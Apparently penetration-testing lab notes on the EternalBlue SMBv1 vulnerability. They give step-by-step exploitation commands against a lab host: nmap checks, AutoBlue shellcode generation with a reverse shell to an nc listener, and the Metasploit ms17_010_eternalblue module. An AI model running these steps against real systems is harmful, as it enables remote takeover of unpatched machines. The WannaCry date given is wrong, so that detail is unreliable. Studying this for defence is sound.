- EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
- The EternalBlue exploit as developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadow Brokers in 2017.
- The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.
- Exploitation through EternalBlue does not only provide the attacker with just user access to the system, but instead, privileged access, implying that there is no need to perform privilege escalation while performing exploitation through these vulnerabilities.
- The EternalBlue exploit was used in the WannaCry ransomware attack on June 27, 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.
- This vulnerability affects multiple versions of Windows:
	- Windows Vista
	- Windows 7
	- Windows Server 2008
	- Windows 8.1
	- Windows Server 2012
	- Windows 10
	- Windows Server 2016
- Microsoft released a patch for the vulnerability in March, 2017, however many users and companies have still not patched their systems.

Exploitation
- The EternalBlue exploit has a MSF auxiliary module that can be used to check if a target system is vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems.
- The EternalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.
- In addition to the MSF modules, we can also manually exploit the vulnerability by utilizing publicly available exploit code

Tools & Environment
- AutoBlue-MS17-010: https://github.com/3ndG4me/AutoBlue-MS17-010
- Target System: Windows Server 2008 R2
- Penetration Testing Distribution: Kali Linux

Practical Demonstration
- `sudo nmap -sV -p 445 -O 10.10.10.12`
- `sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 10.10.10.12`
- Manual Exploitation
	- `git clone https://github.com/3ndG4me/AutoBlue-MS17-010`
	- `cd AutoBlue-MS17-010`
	- `ls`
	- `pip install -r requirements.txt`
	- `cd shellcode`
	- `chmod +x shell_prep.sh`
	- `./shell_prep.sh`
		- Auto-generation of a reverse shell with msfvenom: `yes`
		- LHOST: `10.10.10.10`
		- LPORT (x64): `1234`
		- LPORT (x86): `1234`
		- Meterpreter Shell (0) or CMD Shell (1): `1`
		- Staged Payload (0) or Stage-less Payload (1): `1`
	- `ls`
	- Setting up a netcat listener on a different terminal: `nc -nvlp 1234`
	- `cd ..`
	- `chmod +x eternalblue_exploit7.py`
	- `python eternalblue_exploit7.py 10.10.10.12 shellcode/sc_x64.bin`
	- Check the terminal you set up earlier to listen on the LPORT.
		- `whoami`
- Automated Exploitation, using Metasploit Framework
	- `msfconsole`
	- `search eternalblue`
	- `use exploit/windows/smb/ms17_010_eternalblue`
	- `show options`
	- `set LHOST 10.10.10.10`
	- `set LPORT 1234`
	- `set RHOSTS 10.10.10.12`
	- `exploit`
	- Meterpreter Session
		- `whoami`
		- `getuid`